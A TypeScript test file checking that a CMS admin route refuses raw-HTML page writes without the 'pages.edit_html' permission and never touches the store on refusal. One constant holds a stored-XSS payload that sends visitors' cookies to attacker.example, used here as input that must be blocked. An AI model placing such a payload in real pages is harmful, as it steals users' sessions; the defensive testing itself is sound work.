import assert from "node:assert/strict";
import { once } from "node:events";
import { createServer } from "node:http";
import type { AddressInfo } from "node:net";
import test from "node:test";

import express from "express";

import {
  InMemoryPolicyPermissionRepo,
  InMemoryPolicyRepo,
  InMemoryPrincipalPolicyRepo,
  InMemoryPrincipalRepo,
  InMemoryPrincipalRoleRepo,
  InMemoryRolePolicyRepo,
  InMemoryRoleRepo,
  InMemorySessionRepo,
  InMemoryUserRepo,
  authorize,
  migrateDeprecatedPermissionGrants,
  seedIdentity,
  type IdentityRepos,
} from "@jini-ai/cms/identity";

import type { PagesHtmlDocumentStorePort } from "#src/features/pages/index";
import { applyBuiltinRoleGrants } from "#src/features/identity/builtin-role-grants";
import { registerAdminPageUpdateHtmlRoute } from "#src/server/inbound/admin-http/routes/pages/update-html";
import type { ContentRouteDeps } from "#src/server/inbound/admin-http/routes/content/deps";

/**
 * @file The permission gate on `PUT /pages/:pageId/html` (2026-08-10; retargeted to
 * `pages.edit_html` 2026-09-05).
 *
 * **The refusal is the point of this file, not the happy path.** Until this gate landed the route
 * carried no per-action authz at all — its own header said so — while the agent-tool path to the
 * exact same store checked `content.write`. A test that only asserts a 200 for an authorized caller
 * passes identically against a completely ungated route and proves nothing; the assertions that
 * actually pin the gate are the 403 and, more importantly, that the STORE WAS NEVER TOUCHED on a
 * refusal. A 403 that still wrote the row would be worse than no gate, because it would look closed.
 *
 * **2026-09-05 — the permission changed, and so did what this file certifies.** `content.write` was
 * always the interim gate, and the route's own header said what it did not buy: `editor` holds
 * `content.write`, so an editor could write unsanitized markup into a public page. SPEC-047 REQ-9's
 * `pages.edit_html` is now real and is what this route checks. The literal-string assertions below
 * are therefore the load-bearing ones — see `LITERAL_PERMISSION`'s own note.
 *
 * Harness: a bare `express()` app with this one registrar mounted and fake deps, following
 * `features/post/__tests__/agent-tools.delete-confirmation.test.ts`'s recorded-`authorize` pattern.
 * Deliberately NOT `createApp()` (as `admin-page-html-route.test.ts` uses): that boots the real
 * composition root against the real `content.db` and needs seeded principals and policy rows, none
 * of which the gate MECHANICS depend on. A recorded fake is also the only way to assert the EXACT
 * permission string the route asks for, which is the thing most likely to silently drift.
 *
 * The last three tests in this file are the exception, and are the ones that make the others mean
 * something: they drop the fake and run real role-seeded principals, seeded exactly as first boot
 * seeds them (in both the fresh and the already-deployed vintage — see `realIdentityHarness`'s own
 * comment), through the real `authorize()` at this real route. The fake tests prove "the route
 * demands `pages.edit_html`"; those prove "an editor does not have it and is refused here, and an
 * admin has it in every vintage that ships". `features/pages/__tests__/edit-html-permission.test.ts`
 * certifies the same boundary at the OTHER sink (`pages_write_html`) — there are exactly two writers
 * of `"html"`-format rows, and closing one
 * without the other would leave the capability reachable by a different door.
 */

const WS = "ws-page-html-auth";
const PRINCIPAL_ID = "principal-under-test";
const PAGE_ID = "page-1";

/**
 * Pinned literally rather than imported from the route module, deliberately. `authorize()` matches
 * `policy_permissions` rows by exact string and never consults the permission catalog, so a typo or
 * a drift to an unseeded name would not fail loudly — it would silently refuse every principal
 * except `owner`, which reads as "the feature broke" long after the change that caused it. Reading
 * the constant out of the module under test would make this file agree with such a typo instead of
 * catching it.
 */
const LITERAL_PERMISSION = "pages.edit_html";

interface Harness {
  readonly baseUrl: string;
  readonly authorizeCalls: { principalId?: unknown; permission?: unknown; workspaceId?: unknown }[];
  readonly storeCalls: string[];
  /** Every scope the route opened the store with — S1 (fix plan 2026-09-24 row 14) pins `actorId`. */
  readonly storeScopes: { workspaceId: string; postId: string; actorId?: string }[];
}

/**
 * Boot the route alone, with `authorize` recorded and the store recording every method it is asked
 * for. `allow` decides the gate's answer.
 */
async function harness(t: { after: (fn: () => Promise<void>) => void }, options: { allow: boolean }): Promise<Harness> {
  const authorizeCalls: Harness["authorizeCalls"] = [];
  const storeCalls: string[] = [];
  const storeScopes: Harness["storeScopes"] = [];

  const store: PagesHtmlDocumentStorePort = {
    ensureHtmlFormat: async () => {
      storeCalls.push("ensureHtmlFormat");
    },
    read: async () => {
      storeCalls.push("read");
      return "<p>stored</p>";
    },
    write: async () => {
      storeCalls.push("write");
    },
  };

  const deps = {
    workspaceId: WS,
    authorize: async (params: Record<string, unknown>) => {
      authorizeCalls.push(params);
      return options.allow ? { allowed: true, reason: "matched" } : { allowed: false, reason: "insufficient_permission" };
    },
    pagesHtmlStore: (scope: Harness["storeScopes"][number]) => {
      storeScopes.push(scope);
      return store;
    },
    postRepo: {
      findById: async () => ({ id: PAGE_ID, kind: "page", bodyFormat: "html", bodyHtml: "<p>stored</p>" }),
    },
  } as unknown as ContentRouteDeps;

  const app = express();
  app.use(express.json());
  // Stands in for `requireAdminSession`, which every /api/admin route already sits behind — this
  // file is about AUTHORIZATION (what an authenticated principal may do), not authentication.
  app.use((_req, res, next) => {
    res.locals.principal = { id: PRINCIPAL_ID };
    next();
  });
  registerAdminPageUpdateHtmlRoute(app, deps);

  const server = createServer(app);
  server.listen(0);
  await once(server, "listening");
  t.after(() => new Promise<void>((resolve) => server.close(() => resolve())));

  const { port } = server.address() as AddressInfo;
  return { baseUrl: `http://127.0.0.1:${port}`, authorizeCalls, storeCalls, storeScopes };
}

function putHtml(baseUrl: string, body: unknown) {
  return fetch(`${baseUrl}/api/admin/v1/workspaces/${WS}/pages/${PAGE_ID}/html`, {
    method: "PUT",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(body),
  });
}

// ---------------------------------------------------------------------------
// The refusal path — the primary certification.
// ---------------------------------------------------------------------------

test("PUT /pages/:id/html REFUSES a principal without pages.edit_html: 403 FORBIDDEN, and the store is never touched", async (t) => {
  const { baseUrl, authorizeCalls, storeCalls } = await harness(t, { allow: false });

  const response = await putHtml(baseUrl, { html: "<p>hostile</p>" });
  const body = (await response.json()) as { error: string; code: string; details: { permission: string } };

  assert.equal(response.status, 403, "an unauthorized principal must be refused, not served");
  assert.equal(body.code, "FORBIDDEN");
  assert.equal(body.details.permission, LITERAL_PERMISSION);
  assert.match(body.error, /is not authorized for 'pages\.edit_html'/);

  // The assertion that makes this test worth having. Status codes are cheap; what matters is that
  // no part of the write chain ran. `ensureHtmlFormat` alone would already have CONVERTED the page's
  // body_format and dropped its body_json — a destructive side effect, reached before any write.
  assert.deepEqual(storeCalls, [], "a refused request must not reach the store at all");
  assert.equal(authorizeCalls.length, 1);
});

test("PUT /pages/:id/html asks for exactly 'pages.edit_html', scoped to the route's workspace and the authenticated principal", async (t) => {
  const { baseUrl, authorizeCalls } = await harness(t, { allow: false });

  await putHtml(baseUrl, { html: "<p>x</p>" });

  // See LITERAL_PERMISSION's note for why this is a hand-typed string and not an import.
  assert.deepEqual(authorizeCalls[0], {
    principalId: PRINCIPAL_ID,
    permission: LITERAL_PERMISSION,
    workspaceId: WS,
  });
});

test("PUT /pages/:id/html authorizes BEFORE validating the body — an unauthorized caller cannot probe what the endpoint accepts", async (t) => {
  const { baseUrl, storeCalls } = await harness(t, { allow: false });

  // A body that would otherwise earn a 400 VALIDATION_ERROR. The refusal must win.
  const response = await putHtml(baseUrl, { html: { not: "a string" } });

  assert.equal(response.status, 403, "authz must precede validation, so a 400 never leaks endpoint shape to an unauthorized caller");
  assert.deepEqual(storeCalls, []);
});

// ---------------------------------------------------------------------------
// The allow path — present only to prove the gate is a gate and not a wall.
// ---------------------------------------------------------------------------

test("PUT /pages/:id/html still serves an authorized principal, running the full ensureHtmlFormat -> read -> write sequence", async (t) => {
  const { baseUrl, authorizeCalls, storeCalls } = await harness(t, { allow: true });

  const response = await putHtml(baseUrl, { html: "<p>legitimate</p>" });

  assert.equal(response.status, 200, await response.clone().text());
  assert.equal(authorizeCalls.length, 1);
  // Order matters and is asserted, not just membership: `read()` is what captures the version
  // `write()` conditions its compare-and-set on (CIC-1), so a reordering would silently turn the
  // write into an unconditional overwrite.
  assert.deepEqual(storeCalls, ["ensureHtmlFormat", "read", "write"]);
});

test("PUT /pages/:id/html opens the store as the authenticated principal, so its post_revisions rows are attributed to them (S1)", async (t) => {
  const { baseUrl, storeScopes } = await harness(t, { allow: true });

  const response = await putHtml(baseUrl, { html: "<p>legitimate</p>" });

  assert.equal(response.status, 200, await response.clone().text());
  // Without `actorId` the store falls back to SYSTEM_ACTOR_ID and every human edit made through the
  // admin editor is ledgered as the system's.
  assert.deepEqual(storeScopes, [{ workspaceId: WS, postId: PAGE_ID, actorId: PRINCIPAL_ID }]);
});

// ---------------------------------------------------------------------------
// The real privilege boundary — no fake `authorize`, a genuinely seeded editor.
// ---------------------------------------------------------------------------

/**
 * Which vintage of `seedIdentity`'s built-in grant lists the workspace behind this harness was
 * seeded from — see {@link dropAdminThemeEdit}. `"pre-theme-edit"` is what this repo's own
 * `sites/tovu-com/content.db` actually is, and the vintage every already-deployed workspace is
 * stuck at, since `seedIdentity` early-returns once an owner user exists.
 */
type Vintage = "fresh" | "pre-theme-edit";

/**
 * Rewind the seeded `admin` policy to its pre-`theme.edit` vintage by removing that one row.
 *
 * Same technique as `features/pages/__tests__/edit-html-permission.test.ts`'s `dropAdminThemeEdit`
 * (the anchor fix for this exact gap at the OTHER sink, `db83fdaf`) — duplicated here rather than
 * imported: this repo has no established convention for sharing a fixture helper across a
 * feature's own `__tests__` directory and a route test under `server/__tests__`, and each of these
 * certification files is deliberately self-contained (see this file's own header) so a reader never
 * has to leave it to see exactly what state a case runs against.
 *
 * Asserts the row was there before removing it, deliberately: if `theme.edit` ever leaves
 * `BUILTIN_ADMIN_PERMISSIONS`, this fixture would otherwise silently stop simulating anything and
 * the `"pre-theme-edit"` case would start passing for the wrong reason.
 */
async function dropAdminThemeEdit(repos: IdentityRepos): Promise<void> {
  const policy = await repos.policies.findByName({ workspaceId: WS, name: "admin-builtin-policy" });
  assert.ok(policy, "seedIdentity must have created the built-in admin policy");

  const grants = await repos.policyPermissions.listByPolicyId({ workspaceId: WS, policyId: policy.id });
  const themeEdit = grants.find((row) => row.permission === "theme.edit");
  assert.ok(themeEdit, "the current admin seed list must still contain theme.edit for this rewind to mean anything");

  await repos.policyPermissions.delete({ workspaceId: WS, id: themeEdit.id });
}

/**
 * Mount this route behind the REAL `authorize()`, over identity repos seeded exactly the way first
 * boot seeds them, with the real permission-migration fan-out and built-in-role backfill applied on
 * top.
 *
 * Every test above stubs the gate's answer, which is right for pinning the route's mechanics and
 * useless for the question that actually matters: does a real `editor` get in, and does a real
 * `admin` — in the vintage that ships — stay in? That question spans `seedIdentity`'s built-in role
 * grants, `migrateDeprecatedPermissionGrants`' fan-out (the only way a new permission reaches an
 * ALREADY-seeded workspace — `seedIdentity` early-returns once an owner exists), and
 * `applyBuiltinRoleGrants`' backfill (the only path that reaches admin in a workspace that never had
 * `theme.edit` to fan out from — see {@link Vintage}), none of which a stubbed `authorize` exercises
 * at all.
 *
 * @param roleName - which built-in role the calling principal holds.
 * @param vintage - defaults to `"fresh"`; pass `"pre-theme-edit"` to certify the vintage that
 *   actually ships (see {@link Vintage}).
 */
async function realIdentityHarness(
  t: { after: (fn: () => Promise<void>) => void },
  roleName: "admin" | "editor",
  vintage: Vintage = "fresh"
): Promise<{ baseUrl: string; storeCalls: string[]; principalId: string }> {
  const repos: IdentityRepos = {
    principals: new InMemoryPrincipalRepo(),
    users: new InMemoryUserRepo(),
    sessions: new InMemorySessionRepo(),
    roles: new InMemoryRoleRepo(),
    policies: new InMemoryPolicyRepo(),
    policyPermissions: new InMemoryPolicyPermissionRepo(),
    rolePolicies: new InMemoryRolePolicyRepo(),
    principalRoles: new InMemoryPrincipalRoleRepo(),
    principalPolicies: new InMemoryPrincipalPolicyRepo(),
  };
  let counter = 0;
  const idGen = { newId: () => `id-${++counter}` };
  const clock = { nowIso: () => "2026-09-05T00:00:00.000Z" };

  await seedIdentity({
    // argon2id is ~100ms and nothing here verifies a password; the seed only needs SOME hasher.
    deps: { repos, hasher: { hash: async (p: string) => `h:${p}`, verify: async () => true }, clock, idGen },
    input: { workspaceId: WS, ownerUsername: "owner-under-test", ownerPassword: "irrelevant" },
  });

  if (vintage === "pre-theme-edit") await dropAdminThemeEdit(repos);

  await migrateDeprecatedPermissionGrants({
    policyPermissions: repos.policyPermissions,
    policies: repos.policies,
    idGen,
    workspaceId: WS,
  });

  // SPEC-047 REQ-9's second grant path — see {@link Vintage} and `dropAdminThemeEdit`'s comment.
  // Ordered after the fan-out, matching `features/identity/wiring.ts`'s own boot sequence, so a
  // grant the fan-out would already have made is a no-op here rather than a race.
  await applyBuiltinRoleGrants({
    roles: repos.roles,
    rolePolicies: repos.rolePolicies,
    policies: repos.policies,
    policyPermissions: repos.policyPermissions,
    idGen,
    workspaceId: WS,
  });

  const role = (await repos.roles.list({ workspaceId: WS })).find((row) => row.name === roleName);
  assert.ok(role, `the built-in '${roleName}' role must exist after seeding`);

  const principalId = `principal-${roleName}`;
  await repos.principals.save({
    id: principalId,
    workspaceId: WS,
    kind: "user",
    displayName: roleName,
    status: "active",
    createdAt: clock.nowIso(),
  });
  await repos.principalRoles.save({ id: `pr-${roleName}`, workspaceId: WS, principalId, roleId: role.id });

  const storeCalls: string[] = [];
  const store: PagesHtmlDocumentStorePort = {
    ensureHtmlFormat: async () => {
      storeCalls.push("ensureHtmlFormat");
    },
    read: async () => {
      storeCalls.push("read");
      return "<p>stored</p>";
    },
    write: async () => {
      storeCalls.push("write");
    },
  };

  const deps = {
    workspaceId: WS,
    authorize: (params: { principalId: string; permission: string; entityType?: string }) =>
      authorize({
        deps: {
          principals: repos.principals,
          principalRoles: repos.principalRoles,
          rolePolicies: repos.rolePolicies,
          principalPolicies: repos.principalPolicies,
          policyPermissions: repos.policyPermissions,
        },
        principalId: params.principalId,
        permission: params.permission,
        context: { workspaceId: WS, entityType: params.entityType },
      }),
    pagesHtmlStore: () => store,
    postRepo: {
      findById: async () => ({ id: PAGE_ID, kind: "page", bodyFormat: "html", bodyHtml: "<p>stored</p>" }),
    },
  } as unknown as ContentRouteDeps;

  const app = express();
  app.use(express.json());
  app.use((_req, res, next) => {
    res.locals.principal = { id: principalId };
    next();
  });
  registerAdminPageUpdateHtmlRoute(app, deps);

  const server = createServer(app);
  server.listen(0);
  await once(server, "listening");
  t.after(() => new Promise<void>((resolve) => server.close(() => resolve())));

  const { port } = server.address() as AddressInfo;
  return { baseUrl: `http://127.0.0.1:${port}`, storeCalls, principalId };
}

/** A payload whose whole point is that it executes in every visitor's browser once the page renders. */
const SCRIPT_INJECTION = `<section data-agent-element="hero"><script>fetch('https://attacker.example/'+document.cookie)</script></section>`;

test("a real, seeded 'editor' principal cannot inject script into a public page through this route — 403, and the store is never touched", async (t) => {
  const { baseUrl, storeCalls, principalId } = await realIdentityHarness(t, "editor");

  const response = await putHtml(baseUrl, { html: SCRIPT_INJECTION });
  const body = (await response.json()) as { error: string; code: string; details: { permission: string; reason: string } };

  assert.equal(response.status, 403, "an editor must not be able to author raw HTML into a public page (SPEC-047 REQ-9)");
  assert.equal(body.code, "FORBIDDEN");
  assert.equal(body.details.permission, LITERAL_PERMISSION);
  // `no_grant` specifically: it proves NO row for this permission reached the editor's policy at
  // all, rather than a row landing there and being refused for an incidental reason.
  assert.equal(body.details.reason, "no_grant");
  assert.equal(body.error, `principal '${principalId}' is not authorized for 'pages.edit_html' (no_grant)`);

  assert.deepEqual(storeCalls, [], "a refused request must not reach the store at all");
});

test("a real, seeded 'admin' principal still authors page HTML through this route — the gate narrows the capability rather than removing it", async (t) => {
  const { baseUrl, storeCalls } = await realIdentityHarness(t, "admin");

  const response = await putHtml(baseUrl, { html: "<p>legitimate</p>" });

  assert.equal(response.status, 200, await response.clone().text());
  assert.deepEqual(storeCalls, ["ensureHtmlFormat", "read", "write"]);
});

// ---------------------------------------------------------------------------
// The vintage that actually ships: an ALREADY-seeded workspace, seeded before `theme.edit` joined
// BUILTIN_ADMIN_PERMISSIONS. `sites/tovu-com/content.db` is exactly this — its `admin-builtin-policy`
// has no `theme.edit` row, so `migrateDeprecatedPermissionGrants`' fan-out matches nothing and grants
// nothing at this sink either. Without this case, this file's admin-allow test above only ever proves
// the fan-out path; if `applyBuiltinRoleGrants` (or its registration in `features/pages/permissions.ts`)
// were ever dropped, that test would keep passing GREEN while admin silently lost `pages.edit_html` on
// every real deployed workspace at this exact HTTP-route sink.
// ---------------------------------------------------------------------------

test("a real, seeded 'admin' principal in a pre-theme.edit (already-deployed) workspace ALSO authors page HTML through this route — the grant cannot depend on a seed row that workspace never got", async (t) => {
  const { baseUrl, storeCalls } = await realIdentityHarness(t, "admin", "pre-theme-edit");

  const response = await putHtml(baseUrl, { html: "<p>legitimate</p>" });

  assert.equal(response.status, 200, await response.clone().text());
  assert.deepEqual(storeCalls, ["ensureHtmlFormat", "read", "write"]);
});
